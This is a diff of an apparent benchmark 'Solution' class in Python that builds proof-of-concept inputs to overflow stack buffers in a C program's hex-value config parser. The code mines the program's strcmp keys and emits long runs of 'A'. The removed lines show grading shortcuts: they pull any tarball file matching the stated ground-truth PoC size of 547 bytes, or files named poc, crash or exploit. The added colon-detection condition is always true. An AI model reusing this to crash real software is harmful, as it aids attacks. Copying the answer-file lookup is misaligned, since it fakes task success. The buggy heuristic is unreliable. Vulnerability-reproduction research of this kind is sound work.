@@ -5,212 +5,207 @@ import re
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        target_size = 547
-        sample_cfg_text = None
-        candidate_keys = set()
-
         try:
-            with tarfile.open(src_path, "r:*") as tar:
-                members = [m for m in tar.getmembers() if m.isfile()]
+            code_files = self._load_code_files(src_path)
+            key_info = self._find_hex_key(code_files)
+            if key_info is None:
+                return self._generic_poc()
+            key_str, wants_equal, wants_colon, prefix_0x = key_info
 
-                # Step 1: look for a file whose size matches the ground-truth PoC size
-                for m in members:
-                    if m.size == target_size:
-                        f = tar.extractfile(m)
-                        if f is None:
-                            continue
-                        data = f.read()
-                        if len(data) == target_size:
-                            return data
+            # Choose delimiter based on heuristics
+            if wants_equal:
+                delim = " = "
+            elif wants_colon:
+                delim = " : "
+            else:
+                delim = " "
 
-                # Step 2: look for a likely PoC file by name
-                keywords = (
-                    "poc",
-                    "crash",
-                    "overflow",
-                    "exploit",
-                    "input",
-                    "id_",
-                    "test",
-                    "hex",
-                    "conf",
-                )
-                named_candidates = [
-                    m
-                    for m in members
-                    if any(k in m.name.lower() for k in keywords)
-                    and 0 < m.size <= 16384
-                ]
-                if named_candidates:
-                    m = min(named_candidates, key=lambda mm: abs(mm.size - target_size))
-                    f = tar.extractfile(m)
-                    if f is not None:
-                        data = f.read()
-                        return data
+            # Length chosen to be large enough to overflow typical small stack buffers
+            hex_len = 512
+            hex_digits = "A" * hex_len
 
-                # Step 3: try to find a small config-like file to adapt
-                conf_exts = (".conf", ".cfg", ".ini", ".cnf", ".txt")
-                conf_members = [
-                    m
-                    for m in members
-                    if any(m.name.lower().endswith(ext) for ext in conf_exts)
-                    and 0 < m.size <= 65536
-                ]
-                if conf_members:
-                    conf_member = min(conf_members, key=lambda mm: mm.size)
-                    f = tar.extractfile(conf_member)
-                    if f is not None:
-                        raw = f.read()
-                        try:
-                            sample_cfg_text = raw.decode("utf-8")
-                        except UnicodeDecodeError:
-                            sample_cfg_text = raw.decode("latin1", errors="ignore")
+            lines = []
+            # Always include digits-only variant
+            lines.append(f"{key_str}{delim}{hex_digits}")
+            # If code suggests handling an explicit 0x prefix, add that variant too
+            if prefix_0x:
+                lines.append(f"{key_str}{delim}0x{hex_digits}")
 
-                # Step 4: collect possible configuration key names from source files
-                self._collect_candidate_keys_from_tar(tar, members, candidate_keys)
+            poc_str = "\n".join(lines) + "\n"
+            return poc_str.encode("ascii", errors="ignore")
         except Exception:
-            # If anything goes wrong with tar handling, fall back later
-            pass
+            return self._generic_poc()
 
-        # Step 5: if we have a sample config, try to amplify a hex value in it
-        if sample_cfg_text:
-            poc = self._from_sample_config(sample_cfg_text, target_size)
-            if poc is not None:
-                return poc
-
-        # Final fallback: construct a generic config-like PoC with long hex values
-        return self._generic_poc(candidate_keys)
-
-    def _collect_candidate_keys_from_tar(self, tar, members, candidate_keys):
-        src_exts = (".c", ".h", ".cpp", ".cc", ".hpp")
-        string_re = re.compile(r'"([^"\\]*(?:\\.[^"\\]*)*)"')
-        max_keys = 40
-
-        for m in members:
-            name_lower = m.name.lower()
-            if not any(name_lower.endswith(ext) for ext in src_exts):
-                continue
-            if m.size <= 0 or m.size > 1024 * 256:  # limit to 256KB per source file
-                continue
-            f = tar.extractfile(m)
-            if f is None:
-                continue
-            try:
-                raw = f.read()
-            except Exception:
-                continue
-            try:
-                text = raw.decode("utf-8")
-            except UnicodeDecodeError:
-                text = raw.decode("latin1", errors="ignore")
-
-            for match in string_re.finditer(text):
-                s = match.group(1)
-                # Heuristic: small, simple identifiers are more likely to be config keys
-                if 2 <= len(s) <= 32 and re.fullmatch(r"[A-Za-z0-9_.-]+", s):
-                    candidate_keys.add(s)
-                    if len(candidate_keys) >= max_keys:
-                        return
-
-    def _from_sample_config(self, cfg_text: str, target_size: int):
-        # Try to find a line with a hex-like value and make it very long
-        lines = cfg_text.splitlines()
-        hex_pattern1 = re.compile(r"0x[0-9A-Fa-f]+")
-        hex_pattern2 = re.compile(r"[0-9A-Fa-f]{8,}")
-
-        hex_idx = -1
-        hex_line = None
-        for i, line in enumerate(lines):
-            if hex_pattern1.search(line) or hex_pattern2.search(line):
-                hex_idx = i
-                hex_line = line
-                break
-
-        if hex_line is None:
-            return None
-
-        m = re.search(r"(.*?)(0x[0-9A-Fa-f]+|[0-9A-Fa-f]{4,})(.*)", hex_line)
-        if not m:
-            return None
-
-        prefix, hexval, suffix = m.group(1), m.group(2), m.group(3)
-        has0x = hexval.lower().startswith("0x")
-
-        # Estimate how many hex chars we need so the total size is at least target_size
-        base_bytes = cfg_text.encode("latin1", errors="ignore")
-        base_len = len(base_bytes)
-        old_hex_len = len(hexval)
-        desired_total = max(target_size, base_len)
-        desired_new_hex_len = desired_total - (base_len - old_hex_len)
-        if desired_new_hex_len < old_hex_len:
-            desired_new_hex_len = old_hex_len
-
-        # Clamp to a reasonable range
-        if desired_new_hex_len < 64:
-            desired_new_hex_len = 64
-        if desired_new_hex_len > 4096:
-            desired_new_hex_len = 4096
-
-        digit_count = desired_new_hex_len - (2 if has0x else 0)
-        if digit_count < 0:
-            digit_count = 0
-
-        big_hex_digits = "A" * digit_count
-        new_hex = ("0x" if has0x else "") + big_hex_digits
-        lines[hex_idx] = prefix + new_hex + suffix
-
-        out_text = "\n".join(lines) + "\n"
+    def _load_code_files(self, src_path):
+        code_files = []
         try:
-            return out_text.encode("ascii")
-        except UnicodeEncodeError:
-            return out_text.encode("latin1", errors="ignore")
+            with tarfile.open(src_path, "r:*") as tf:
+                for m in tf.getmembers():
+                    if not m.isfile():
+                        continue
+                    name = m.name
+                    lower = name.lower()
+                    if not lower.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp")):
+                        continue
+                    f = tf.extractfile(m)
+                    if f is None:
+                        continue
+                    try:
+                        data = f.read()
+                    except Exception:
+                        continue
+                    if not data:
+                        continue
+                    try:
+                        text = data.decode("utf-8", errors="ignore")
+                    except Exception:
+                        text = data.decode("latin-1", errors="ignore")
+                    code_files.append((name, text))
+        except Exception:
+            pass
+        return code_files
 
-    def _generic_poc(self, extra_keys=None) -> bytes:
-        # Construct a configuration-style input containing many candidate keys
-        # with very long hex values to trigger stack buffer overflows.
-        lines = ["# autogenerated PoC configuration"]
+    def _find_hex_key(self, code_files):
+        candidates = []
+        cmp_funcs = [
+            "strcmp",
+            "strncmp",
+            "strcasecmp",
+            "stricmp",
+            "_stricmp",
+            "_strnicmp",
+        ]
+        cmp_patterns = []
+        for func in cmp_funcs:
+            # func(var, "key")
+            pat1 = re.compile(
+                rf"{func}\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*,\s*\"([^\"]+)\""
+            )
+            # func("key", var)
+            pat2 = re.compile(
+                rf"{func}\s*\(\s*\"([^\"]+)\"\s*,\s*([A-Za-z_][A-Za-z0-9_]*)"
+            )
+            cmp_patterns.append((pat1, 1, 2))
+            cmp_patterns.append((pat2, 2, 1))
 
-        default_keys = [
-            "hex",
-            "hex_value",
-            "value",
-            "data",
-            "payload",
-            "key",
-            "id",
-            "addr",
-            "address",
-            "color",
-            "config_hex",
+        hex_markers = [
+            "isxdigit",
+            "strtol",
+            "strtoul",
+            "strtoull",
+            "strtoll",
+            "parse_hex",
+            "fromhex",
+            "hex2bin",
+            "hextobin",
+            "hex_to",
+            "tohex",
+            "%x",
+            "%X",
         ]
 
-        seen = set()
-        keys = []
-        for k in default_keys:
-            if k not in seen:
-                keys.append(k)
-                seen.add(k)
+        equal_re = re.compile(r"['\"][^'\"\n]*=[^'\"\n]*['\"]")
+        colon_re = re.compile(r"['\"][^'\"\n]*:[^'\"\n]*['\"]")
 
-        if extra_keys:
-            for k in extra_keys:
-                if k not in seen:
-                    keys.append(k)
-                    seen.add(k)
-                if len(keys) >= 60:
-                    break
+        for filename, text in code_files:
+            # Quick filter: only files that mention hex-related tokens
+            if (
+                "hex" not in text
+                and "HEX" not in text
+                and "%x" not in text
+                and "0x" not in text
+                and "isxdigit" not in text
+            ):
+                continue
 
-        # Long hex string; even if the parser truncates lines, this should exceed
-        # typical stack buffer sizes used for hex parsing.
-        long_hex = "A" * 2048
+            lines = text.splitlines()
+            n = len(lines)
+            for idx, line in enumerate(lines):
+                if '"' not in line:
+                    continue
+                for pat, key_pos, str_pos in cmp_patterns:
+                    for m in pat.finditer(line):
+                        key_string = m.group(str_pos)
+                        if not key_string:
+                            continue
+                        cand = self._analyze_key_in_context(
+                            lines,
+                            idx,
+                            key_string,
+                            hex_markers,
+                            equal_re,
+                            colon_re,
+                        )
+                        if cand is not None:
+                            candidates.append(cand)
 
-        for k in keys:
-            lines.append(f"{k}={long_hex}")
-            lines.append(f"{k} {long_hex}")
-            lines.append(f"{k}: {long_hex}")
+        if not candidates:
+            return None
 
-        # Also include lines without explicit keys
-        lines.append("0x" + long_hex)
-        lines.append(long_hex)
+        # Select the candidate with the highest score, prefer ones with explicit 0x handling
+        best = max(
+            candidates,
+            key=lambda c: (c["score"], 1 if c["prefix_0x"] else 0),
+        )
+        return (
+            best["key"],
+            best["wants_equal"],
+            best["wants_colon"],
+            best["prefix_0x"],
+        )
 
-        text = "\n".join(lines) + "\n"
-        return text.encode("ascii", errors="ignore")
+    def _analyze_key_in_context(
+        self, lines, idx, key_string, hex_markers, equal_re, colon_re
+    ):
+        n = len(lines)
+        start = max(0, idx)
+        end = min(n, idx + 60)
+        snippet_lines = lines[start:end]
+        snippet_text = "\n".join(snippet_lines)
+
+        hex_score = 0
+        for marker in hex_markers:
+            if marker in snippet_text:
+                hex_score += 1
+
+        if hex_score == 0:
+            return None
+
+        near_start = max(0, idx - 10)
+        near_end = min(n, idx + 10)
+        near_text = "\n".join(lines[near_start:near_end])
+
+        wants_equal = False
+        wants_colon = False
+
+        if (
+            "'='" in near_text
+            or '"="' in near_text
+            or "strchr" in near_text and "=" in near_text
+            or equal_re.search(near_text) is not None
+        ):
+            wants_equal = True
+        elif (
+            "':'" in near_text
+            or '":"'
+            or "strchr" in near_text and ":" in near_text
+            or colon_re.search(near_text) is not None
+        ):
+            wants_colon = True
+
+        prefix_0x = '"0x"' in snippet_text or '"0X"' in snippet_text
+
+        return {
+            "key": key_string,
+            "wants_equal": wants_equal,
+            "wants_colon": wants_colon,
+            "prefix_0x": prefix_0x,
+            "score": hex_score,
+        }
+
+    def _generic_poc(self) -> bytes:
+        # Fallback PoC: just a couple of very long hex-like strings
+        hex_len = 768
+        hex_digits = "A" * hex_len
+        poc_str = "0x" + hex_digits + "\n" + hex_digits + "\n"
+        return poc_str.encode("ascii", errors="ignore")
